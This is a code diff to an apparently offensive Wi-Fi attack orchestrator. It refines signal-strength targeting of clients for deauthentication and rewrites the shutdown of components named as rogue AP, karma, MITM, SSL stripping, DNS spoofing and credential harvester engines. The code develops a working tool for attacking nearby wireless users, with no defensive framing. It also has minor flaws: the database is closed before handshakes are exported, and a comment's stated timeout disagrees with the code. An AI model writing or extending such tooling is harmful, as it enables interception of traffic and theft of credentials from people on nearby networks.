@@ -122,6 +122,7 @@ class AttackOrchestrator:
 
         # ── Phase 1: Passive Recon ────────────────────────────────────────────
         log.info(f"Phase 1: Passive recon ({self.recon_duration}s)...")
+        self.recon.set_signal_targeting(self.signal_filter)
         self.recon.start(timeout=self.recon_duration)
         self.recon.stop()
 
@@ -143,14 +144,18 @@ class AttackOrchestrator:
                 log.warning("AP isolation detected - attack may be less effective")
                 log.warning("Clients may not be able to reach our rogue AP")
 
-        # Get all clients of target AP from scan data
-        all_clients = set(self.db.get_clients_for_bssid(self.target_bssid))
+        # Get all clients of target AP from scan data (now returns (mac, rssi) tuples)
+        all_clients_data = self.db.get_clients_for_bssid(self.target_bssid)
+        all_clients = set()
 
-        # Filter by signal strength
+        # Filter by signal strength using RSSI data from database
         close_clients = set()
-        for client in all_clients:
-            if self.signal_filter.should_deauth(client):
-                close_clients.add(client)
+        for client_mac, rssi in all_clients_data:
+            all_clients.add(client_mac)
+            if self.signal_filter.should_deauth(client_mac):
+                close_clients.add(client_mac)
+            elif rssi is not None and self.signal_filter.should_deauth_with_rssi(client_mac, rssi):
+                close_clients.add(client_mac)
 
         log.info(f"Target has {len(all_clients)} total clients, "
                  f"{len(close_clients)} within signal range (RSSI > {self.signal_rssi_limit}dBm)")
@@ -277,38 +282,43 @@ class AttackOrchestrator:
             pass
 
     def stop(self):
-        """Shut down all attack components."""
+        """Shut down all attack components gracefully."""
         self.running = False
-        self.recon.stop()
-        self.deauth.stop()
-        if self.beacons:
-            self.beacons.stop()
-        if self.karma:
-            self.karma.stop()
-        if self.rogue_ap:
-            self.rogue_ap.stop()
-        if self.mitm_engine:
-            self.mitm_engine.stop()
-        if self.ssl_stripper:
-            self.ssl_stripper.stop()
-        if self.dns_spoof:
-            self.dns_spoof.stop()
-        if self.cred_harvester:
-            self.cred_harvester.stop()
-        if self.network_disruption:
-            self.network_disruption.stop()
-
+        
+        # Stop all engines
+        engines = [
+            self.recon, self.deauth, self.beacons, self.karma, 
+            self.rogue_ap, self.mitm_engine, self.ssl_stripper,
+            self.dns_spoof, self.cred_harvester, self.network_disruption
+        ]
+        
+        for engine in engines:
+            if engine:
+                try:
+                    engine.stop()
+                except Exception as e:
+                    log.error(f"Error stopping {engine.__class__.__name__}: {e}")
+        
+        # Wait for background threads (timeout after 10s)
+        import threading
+        for thread in threading.enumerate():
+            if thread != threading.current_thread():
+                thread.join(timeout=1)
+        
+        # Now safe to close database
+        if self.db:
+            self.db.close()
+        
         # Export any remaining handshakes
         remaining = self.handshakes.export_all()
         if remaining:
             log.info(f"Exported {len(remaining)} additional handshakes")
-
+        
         self.recon._print_status()
-        self.db.close()
-
+        
         # Run post-attack analysis
         self._run_post_attack_analysis()
-
+        
         log.info("Attack terminated. All data saved.")
 
     def _run_post_attack_analysis(self):
